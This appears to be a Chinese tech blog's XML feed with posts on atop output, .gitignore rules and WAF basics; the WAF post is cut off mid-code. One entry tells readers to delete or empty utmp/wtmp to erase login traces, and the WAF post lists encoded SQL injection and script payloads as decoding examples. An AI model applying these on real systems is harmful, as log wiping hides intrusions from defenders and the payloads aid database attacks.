126.5G  |              |              |               |              |              | vmcom  18.3G  | vmlim 143.7G |</p><p>DSK |          sda | busy    100%  | read      73 | write   1050 | KiB&#x2F;r      5  | KiB&#x2F;w      6 | MBr&#x2F;s   0.04 | MBw&#x2F;s   0.67  | avio 8.90 ms |</p><p>NET | transport    | tcpi      13  | tcpo      13 | udpi       0 | udpo       0  | tcpao      5 | tcppo      0 | tcprs      0  | udpip   9276 |</p><p>NET | network      | ipi     9745  | ipo       13 | ipfrw      0 | deliv   9292  |              |              | icmpi      0  | icmpo      0 |</p><p>NET | em1       0% | pcki   10260  | pcko       1 | si 2474 Kbps | so    1 Kbps  | erri       0 | erro       0 | drpi       0  | drpo       0 |</p><p>NET | em20% | pcki      18  | pcko       0 | si    1 Kbps | so    0 Kbps  | erri       0 | erro       0 | drpi    0  | drpo       0 |</p><p>NET | lo      —- | pcki      12  | pcko      12 | si    0 Kbps | so    0 Kbps  | erri       0 | erro       0 | drpi       0  | drpo       0 |</p><p>  PID     TID   RUID       EUID        THR   SYSCPU   USRCPU    VGROW    RGROW    RDDSK    WRDSK   ST   EXC   S   CPUNR    CPU   CMD        1&#x2F;2</p><p>38548       -   root       root          1    0.12s    0.05s    1852K    1852K       0K       0K   –     -   R       1     2%   atop</p><p>12749       -   root   root        144    0.02s    0.06s       0K     128K       0K       8K   –     -   S      19     1%   java</p><p>38418       -   sec    sec          54    0.02s    0.03s       0K       0K     360K       8K   –     -   S      18     1%   java</p><p>10876       -   smmsp      smmsp         1    0.00s    0.01s       0K       0K       0K       0K   –     -   D       0     0%   sendmail</p><p> 7570       -   smmsp      smmsp         1    0.01s    0.00s   0K       0K       0K       0K   –     -   D       3     0%   sendmail</p><p>48544       -   root       root         10    0.00s    0.01s   0K     360K       0K      12K   –     -   D       0     0%   node</p><p>31529       -   smmsp      smmsp         1    0.01s    0.00s       0K       0K       0K       0K   –     -   D       5     0%   sendmail</p><p>30859       -   mysql      mysql        16    0.01s    0.00s       0K       0K       0K       0K   –     -   S       0     0%   mysqld</p><p>41246       -   root       root          4    0.00s    0.01s       0K       0K       0K       0K   –     -   S      26     0%   rsyslogd</p><p>  136       -   root    root          1    0.01s    0.00s       0K       0K       0K       0K   –     -   S       5     0%   events&#x2F;5</p><p>  204       -   root       root          1    0.01s    0.00s       0K       0K       0K       0K   –     -   S       2     0%   kblockd&#x2F;2</p><p> 1788       -   root       root          1    0.01s    0.00s   0K       0K       0K       4K   –     -   D       2     0%   flush-8:0</p><p>33709       -   smmsp      smmsp         1    0.00s    0.00s   0K       0K       0K       0K   –     -   D      18     0%   sendmail</p><p>22496       -   smmsp      smmsp         1    0.00s    0.00s   0K       0K       0K       0K   –     -   D      18     0%   sendmail</p><p><img src="/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/image-20240401192203874.png" alt="image-20240401192203874"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Linux top命令的用法详细详解] 莫水千流 2017-01-21 09:09 </p><p>链接：<a href="http://www.cnblogs.com/zhoug2020/p/6336453.html">http://www.cnblogs.com/zhoug2020/p/6336453.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>top</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/15/security/secresponse/attack_hidden/"/>
    <url>/2024/03/15/security/secresponse/attack_hidden/</url>
    
    <content type="html"><![CDATA[<p>登录信息清除</p><p>删除或清空 &#x2F;var&#x2F;run&#x2F;utmp &#x2F;var&#x2F;log&#x2F;wtmp ，删除后不会产生新的文件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>code_repo_reinforce</title>
    <link href="/2024/03/15/security/codesec/code_repo_reinforce/"/>
    <url>/2024/03/15/security/codesec/code_repo_reinforce/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github 为了安全性需要禁止上传敏感内容，所以需要.gitignore 文件来设置哪些文件不需要上传进行版本管理</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/dir/</span> 过滤整个文件夹<br>*<span class="hljs-string">.txt</span> 过滤所有<span class="hljs-string">.txt</span>文件<br><span class="hljs-string">/dir/config.php</span> 过滤具体文件<br></code></pre></td></tr></table></figure><p><img src="/2024/03/15/security/codesec/code_repo_reinforce/image-20241224171307321.png" alt="image-20241224171307321"></p><p>说明：</p><p>过滤掉的文件不会上传，也就是说不会进行版本管理，本地还是会有的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/ 开头表示目录<br>* 通配多个字符<br>? 通配单个字符<br><span class="hljs-string">[]</span> 包含单个字符的匹配列表<br>! 表示不忽略匹配的文件或者目录，也就是会上传<br></code></pre></td></tr></table></figure><p>规则匹配策略：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">自上到下进行匹配<br></code></pre></td></tr></table></figure><h2 id="错误总结"><a href="#错误总结" class="headerlink" title="错误总结"></a>错误总结</h2><p>1、不生效原因</p><p>可能是已经在缓存中，清除缓存，重新上传</p><p>git rm -r –cached .</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>codesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>codesec</tag>
      
      <tag>安全加固</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>waf_base</title>
    <link href="/2024/03/15/security/netsec/waf/waf_base/"/>
    <url>/2024/03/15/security/netsec/waf/waf_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="技能要求"><a href="#技能要求" class="headerlink" title="技能要求"></a>技能要求</h1><p>精通安全防护产品的规则与策略配置<br>熟悉 WAF 系统的主流架构设计以及其中关键技术点，如正则，语义分析，防CC和爬虫技术</p><h1 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h1><h2 id="软-WAF"><a href="#软-WAF" class="headerlink" title="软 WAF"></a>软 WAF</h2><p>以纯软件形式提供 WAF 防护</p><p>代表产品：安全狗、云锁、D 盾</p><h2 id="硬-WAF"><a href="#硬-WAF" class="headerlink" title="硬 WAF"></a>硬 WAF</h2><p>以纯硬件形式提供 WAF 防护</p><p>架构：</p><p>用户 -&gt; 硬件 WAF -&gt; 业务</p><h2 id="云-WAF"><a href="#云-WAF" class="headerlink" title="云 WAF"></a>云 WAF</h2><p>以云服务形式提供 WAF 防护</p><p>用户 -&gt; 云 WAF -&gt; 业务</p><p>代表产品：</p><p>阿里云云盾、腾讯云WAF</p><h1 id="WAF-部署方式"><a href="#WAF-部署方式" class="headerlink" title="WAF 部署方式"></a>WAF 部署方式</h1><h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>将 WAF 串联接入到客户端与 WebServer 之间。</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><h2 id="镜像流量"><a href="#镜像流量" class="headerlink" title="镜像流量"></a>镜像流量</h2><p>通过网络设备复制一份流量给到 WAF ，WAF 检测识别 HTTP 攻击请求。</p><p>不改变原有流量走向，网络层完全透明。</p><p>不支持对攻击请求实时拦截。</p><p>仅支持对 HTTP 流量的检测分析，也就是需要在证书卸载之后</p><h1 id="WAF架构"><a href="#WAF架构" class="headerlink" title="WAF架构"></a>WAF架构</h1><h1 id="WAF技术点"><a href="#WAF技术点" class="headerlink" title="WAF技术点"></a>WAF技术点</h1><p>可以用于数据分析的点</p><p>1、流量来源</p><p>2、流量构成</p><p>3、爬虫类型</p><p>4、爬虫行为</p><h2 id="请求解码方式"><a href="#请求解码方式" class="headerlink" title="请求解码方式"></a>请求解码方式</h2><h3 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span> URL decode后是 <span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="JSON解码"><a href="#JSON解码" class="headerlink" title="JSON解码"></a>JSON解码</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;: <span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>&#125; Json解码后是 <span class="hljs-selector-attr">[a,b]</span>,<span class="hljs-selector-attr">[c,d]</span><br></code></pre></td></tr></table></figure><h3 id="Base64-解码"><a href="#Base64-解码" class="headerlink" title="Base64 解码"></a>Base64 解码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MScgb3IgMT0x</span> Base64解码后是 <span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Base64-RFC-2045-解码"><a href="#Base64-RFC-2045-解码" class="headerlink" title="Base64(RFC 2045) 解码"></a>Base64(RFC 2045) 解码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MSdvciAx</span>.PTEgLS0= BASE64(rfc-<span class="hljs-number">2045</span>)解码后是 <span class="hljs-number">1</span>&#x27;or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --<br></code></pre></td></tr></table></figure><h3 id="16进制转换解码-HEX编码"><a href="#16进制转换解码-HEX编码" class="headerlink" title="16进制转换解码&#x2F;HEX编码"></a>16进制转换解码&#x2F;HEX编码</h3><p>linux中xxd和hexdump命令编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">31</span> Hex解码后是 <span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="二进制解码-BINARY-解码"><a href="#二进制解码-BINARY-解码" class="headerlink" title="二进制解码&#x2F;BINARY 解码"></a>二进制解码&#x2F;BINARY 解码</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0011000100100111001000000111010101101110011010010110111101101110001000000111001101100101011011000110010101100011011101000010000000110001001011000110010001100001011101000110000101100010011000010111001101100101001010000010100100100011 </span>binary 解码后是 <span class="hljs-number">1</span><span class="hljs-comment">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure><h3 id="斜杠转义"><a href="#斜杠转义" class="headerlink" title="斜杠转义"></a>斜杠转义</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\n</span> 斜杠反转义后是 换行(<span class="hljs-string">\x0a)</span><br></code></pre></td></tr></table></figure><h3 id="XML-解码"><a href="#XML-解码" class="headerlink" title="XML 解码"></a>XML 解码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">解码输入:<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">site</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RUNOOB<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://www.runoob.com<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">logo</span>&gt;</span>runoob-logo.png<span class="hljs-tag">&lt;/<span class="hljs-name">logo</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">desc</span>&gt;</span>1&#x27;or &#x27;1&#x27;=&#x27;1<span class="hljs-tag">&lt;/<span class="hljs-name">desc</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">site</span>&gt;</span><br>解码输出 (4 payloads):<br><br>RUNOOB<br>https://www.runoob.com<br>runoob-logo.png<br>1&#x27;or&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><h3 id="PHP-序列化对象解析"><a href="#PHP-序列化对象解析" class="headerlink" title="PHP 序列化对象解析"></a>PHP 序列化对象解析</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;1&#x27; or 1=1&quot;</span>; php 序列化对象解析后是 <span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="UTF7解码"><a href="#UTF7解码" class="headerlink" title="UTF7解码"></a>UTF7解码</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>B\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>F\<span class="hljs-keyword">x</span><span class="hljs-number">76</span>\<span class="hljs-keyword">x</span><span class="hljs-number">38</span>+ADw-script+AD<span class="hljs-number">4</span>- UTF<span class="hljs-number">7</span>解码后是 &lt;script&gt;<br></code></pre></td></tr></table></figure><h2 id="请求特征"><a href="#请求特征" class="headerlink" title="请求特征"></a>请求特征</h2><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>请求原始URI，未解码</p><h3 id="解码后路径"><a href="#解码后路径" class="headerlink" title="解码后路径"></a>解码后路径</h3><p>用户请求中从&#x2F;开始到?结束的部分，并进行一次 URL 解码，如 &#x2F;query news</p><h3 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h3><p>用户请求的 URL 中从?开始到最后的部分，并进行一次 URL 解码，如 q-1 or 1-1</p><h3 id="GET-参数"><a href="#GET-参数" class="headerlink" title="GET 参数"></a>GET 参数</h3><p>用户请求的 URL 中从?开始到最后的部分，拆分为键值对形式后进行一次 URL 解码，如 参数名q参数值1or 1&#x3D;1</p><h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><p>HTTP 请求的 Method，如 GET、POST</p><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>HTTP 请求头中的 Host</p><h3 id="完整-Cookie"><a href="#完整-Cookie" class="headerlink" title="完整 Cookie"></a>完整 Cookie</h3><p>未拆分为键值对形式的 Cookie</p><h3 id="Cookis-参数"><a href="#Cookis-参数" class="headerlink" title="Cookis 参数"></a>Cookis 参数</h3><p>拆分为键值对形式的 Cookie</p><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User Agent"></a>User Agent</h3><p>HTTP 请求头中的 User-Agent</p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>HTTP 请求头中的 Referer</p><h3 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h3><p>HTTP 请求头中的 Content-Type</p><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>HTTP 请求头中的Content-Length</p><h3 id="用户IP"><a href="#用户IP" class="headerlink" title="用户IP"></a>用户IP</h3><p>用户的客户端源 IP</p><h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h3><p>HTTP 请求头中的X-Forwarded-For</p><h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p>HTTP 请求头中的 Origin</p><h3 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h3><p>HTTP 请求头中的 Accept-Language</p><h3 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h3><p>HTTP 请求头中的 Authorization</p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>用户的 Session 内容(需要先配置 Session 获取方式)</p><h3 id="完整-HTTP-header"><a href="#完整-HTTP-header" class="headerlink" title="完整 HTTP header"></a>完整 HTTP header</h3><p>原始 HTTP 完整请求头</p><h3 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h3><p>拆分为键值对形式 HTTP 请求头</p><h3 id="HTTP-请求头长度"><a href="#HTTP-请求头长度" class="headerlink" title="HTTP 请求头长度"></a>HTTP 请求头长度</h3><p>HTTP 请求头的长度</p><h3 id="HTTP-请求体长度"><a href="#HTTP-请求体长度" class="headerlink" title="HTTP 请求体长度"></a>HTTP 请求体长度</h3><p>HTTP 完整 body 的长度</p><h3 id="POST-参数"><a href="#POST-参数" class="headerlink" title="POST 参数"></a>POST 参数</h3><p>HTTP 请求 Body 中 form 类数据，拆分为键值对形式后进行一次 URL 解码</p><h3 id="请求体中任意-key-长度"><a href="#请求体中任意-key-长度" class="headerlink" title="请求体中任意 key 长度"></a>请求体中任意 key 长度</h3><p>HTTP 请求 Body 中 form 类数据中的任意 key 长度</p><h3 id="请求体中任意-val-长度"><a href="#请求体中任意-val-长度" class="headerlink" title="请求体中任意 val 长度"></a>请求体中任意 val 长度</h3><p>HTTP 请求 Body 中 form 类数据中的任意 val 长度</p><h3 id="请求体中-key-数量"><a href="#请求体中-key-数量" class="headerlink" title="请求体中 key 数量"></a>请求体中 key 数量</h3><p>HTTP 请求 Body 中 form 类数据中的 key 数量</p><h3 id="完整-Body"><a href="#完整-Body" class="headerlink" title="完整 Body"></a>完整 Body</h3><p>完整的 HTTP 请求的 Body</p><h3 id="上传的文件名"><a href="#上传的文件名" class="headerlink" title="上传的文件名"></a>上传的文件名</h3><p>Content-Type 为 multipart&#x2F;form-data 或 multipart&#x2F;related 的 HTTP 请求 Body 中的文件名</p><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p>服务端返回的 HTTP 状态码</p><h3 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h3><p>拆分为键值对形式 HTTP 响应头</p><h3 id="完整-HTTP-响应头"><a href="#完整-HTTP-响应头" class="headerlink" title="完整 HTTP 响应头"></a>完整 HTTP 响应头</h3><p>原始 HTTP 完整响应头</p><h3 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h3><p>服务端返回的完整响应内容</p><h2 id="匹配模式"><a href="#匹配模式" class="headerlink" title="匹配模式"></a>匹配模式</h2><p>包含<br>不包含<br>等于<br>不等于<br>正则匹配<br>正则不匹配</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h3 id="限制访问频率"><a href="#限制访问频率" class="headerlink" title="限制访问频率"></a>限制访问频率</h3><p>对请求源访问行为（单URL、多URL和所有URL）进行分析统计，从IP、Session和用户指纹维度进行限制（访问频率限制或访问封禁），自定义频率拦截状态码和页面。</p><h3 id="请求源合法性校验"><a href="#请求源合法性校验" class="headerlink" title="请求源合法性校验"></a>请求源合法性校验</h3><p>对请求源访问行为（单URL、多URL和所有URL）进行匹配记录，满足设定条件（参数频率阈值）触发验证机制</p><h4 id="验证码验证"><a href="#验证码验证" class="headerlink" title="验证码验证"></a>验证码验证</h4><p>算式验证码、字符验证码、滑动验证</p><h4 id="浏览器验证"><a href="#浏览器验证" class="headerlink" title="浏览器验证"></a>浏览器验证</h4><p>JS挑战，返回一段 JavaScript 代码（如计算哈希值、生成 Cookie 等），要求客户端执行并提交结果</p><h3 id="请求混淆加密"><a href="#请求混淆加密" class="headerlink" title="请求混淆加密"></a>请求混淆加密</h3><h5 id="参数加密混淆"><a href="#参数加密混淆" class="headerlink" title="参数加密混淆"></a>参数加密混淆</h5><p>对请求中所有参数或指定参数实施加密混淆</p><h5 id="cookie加密"><a href="#cookie加密" class="headerlink" title="cookie加密"></a>cookie加密</h5><p>自定义签名密钥对cookie实施签名，cookie中增加相应cookie名称的字段，可以指定cookie名称，如果不指定，则对所有设置的cookie实施签名，对从客户端接受到的cookie，WAF尝试进行签名校验和解密，如果是加密或签名正确的cookie，则解密或去除签名提交给服务器，否则保持原样不变提交给服务器。</p><p>也可以把客户端IP作为加密校验元素之一。</p><h3 id="请求动态令牌"><a href="#请求动态令牌" class="headerlink" title="请求动态令牌"></a>请求动态令牌</h3><p>对策略生效范围内的请求,在URL或cookie中添加动态更新的令牌，并进行令牌校验，校验通过后方可正常进行业务访问操作</p><h3 id="响应混淆加密"><a href="#响应混淆加密" class="headerlink" title="响应混淆加密"></a>响应混淆加密</h3><p>1、页面混淆对HTML和JS类型的响应页面进行混淆</p><p>2、去除响应HTML页面中的所有注释</p><h3 id="伪链接"><a href="#伪链接" class="headerlink" title="伪链接"></a>伪链接</h3><p>业务正常 html 页面中增加特定链接，正常用户不会请求，恶意用户请求特定链接（例如爬虫遍历请求页面中所有链接）会进行记录标记。</p><h3 id="页面防调试"><a href="#页面防调试" class="headerlink" title="页面防调试"></a>页面防调试</h3><p>限制客户端对响应页面实施调试</p><h4 id="技术实现方式"><a href="#技术实现方式" class="headerlink" title="技术实现方式"></a>技术实现方式</h4><h5 id="禁用开发者工具"><a href="#禁用开发者工具" class="headerlink" title="禁用开发者工具"></a><strong>禁用开发者工具</strong></h5><p>通过监听键盘事件或鼠标右键事件，阻止用户打开开发者工具。</p><h6 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h6><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 禁用右键菜单</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;contextmenu&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>  e.<span class="hljs-title function_">preventDefault</span>();<br>&#125;);<br><br><span class="hljs-comment">// 禁用 F12、Ctrl+Shift+I、Ctrl+U 等快捷键</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;F12&#x27;</span> || (e.<span class="hljs-property">ctrlKey</span> &amp;&amp; e.<span class="hljs-property">shiftKey</span> &amp;&amp; e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;I&#x27;</span>) || (e.<span class="hljs-property">ctrlKey</span> &amp;&amp; e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;U&#x27;</span>)) &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>();<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h6 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h6><ul><li>用户可以通过浏览器设置或扩展程序绕过限制。</li><li>无法完全阻止开发者工具的打开。</li></ul><h5 id="检测开发者工具"><a href="#检测开发者工具" class="headerlink" title="检测开发者工具"></a>检测开发者工具</h5><p>通过检测开发者工具是否打开，动态修改页面行为或阻止调试。</p><h6 id="实现代码：-1"><a href="#实现代码：-1" class="headerlink" title="实现代码："></a>实现代码：</h6><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">devToolsOpened</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> threshold = <span class="hljs-number">160</span>; <span class="hljs-comment">// 窗口宽度或高度的差值阈值</span><br>    <span class="hljs-keyword">const</span> widthThreshold = <span class="hljs-variable language_">window</span>.<span class="hljs-property">outerWidth</span> - <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> &gt; threshold;<br>    <span class="hljs-keyword">const</span> heightThreshold = <span class="hljs-variable language_">window</span>.<span class="hljs-property">outerHeight</span> - <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> &gt; threshold;<br>    <span class="hljs-keyword">return</span> widthThreshold || heightThreshold;<br>  &#125;;<br><br>  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">devToolsOpened</span>()) &#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;开发者工具已打开，请关闭后继续使用！&#x27;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(); <span class="hljs-comment">// 刷新页面</span><br>    &#125;<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;)();<br></code></pre></td></tr></table></figure><h6 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h6><ul><li>开发者工具打开时，浏览器窗口的 <code>outerWidth</code> 和 <code>innerWidth</code> 会有明显差异。</li><li>通过检测这种差异，判断开发者工具是否打开。</li></ul><h6 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h6><ul><li>用户可以通过禁用 JavaScript 或修改浏览器设置绕过检测。</li><li>部分浏览器可能不支持此方法。</li></ul><p>功能</p><p>1、主动发现风险接口</p><p>2、数据脱敏</p><p>对响应报文作出修改，例如业务将敏感数据打码或拦截等</p><p>3、防御0day攻击</p><p>限制频率黑名单</p><p>​1、黑名单</p><p>​维度：IP&#x2F;session&#x2F;用户指纹？</p><p>​黑名单的上限和什么有关系？CPU？磁盘？</p><p>​黑名单超过上限后，对防御的影响？</p><p>​黑名单如何扩容？</p><p>​</p><p>​2、频率触发策略实际生效地址：检测&#x2F;管理？</p><p>​3、白名单</p><p>​维度：IP&#x2F;session&#x2F;用户指纹？</p><p>​白名单的上限和什么有关系？CPU？磁盘？</p><p>​白名单超过上限后，对防御的影响？</p><p>​白名单如何扩容？</p><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><h3 id="生效阶段-nginx-access阶段"><a href="#生效阶段-nginx-access阶段" class="headerlink" title="生效阶段-nginx_access阶段"></a>生效阶段-nginx_access阶段</h3><p>access阶段生效原因：</p><p>1、性能优化</p><p>在请求处理早期拦截攻击，避免无效请求消耗后端资源</p><p>检测时延较低（基于LuaJIT 的高效性，仅增加 1-3 ms）</p><p>2、数据完备性</p><p>可通过 ngx.reg.get_headers() 获取完整请求头</p><p>通过 ngx.reg.get_post_args() 解析 POST 数据</p><p>支持获取 SSL&#x2F;TLS 握手信息（如 ngx.var.ssl_cipher）</p><p>3、拦截有效性</p><p>可直接调用  ngx.exit(ngx.HTTP_FORBIDDEN) 终止请求</p><p>支持返回自定义拦截页面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ngx.status = <span class="hljs-number">403</span><br>ngx.header[<span class="hljs-string">&quot;Content-Type&quot;</span>] = <span class="hljs-string">&quot;text/html&quot;</span><br>ngx.say(<span 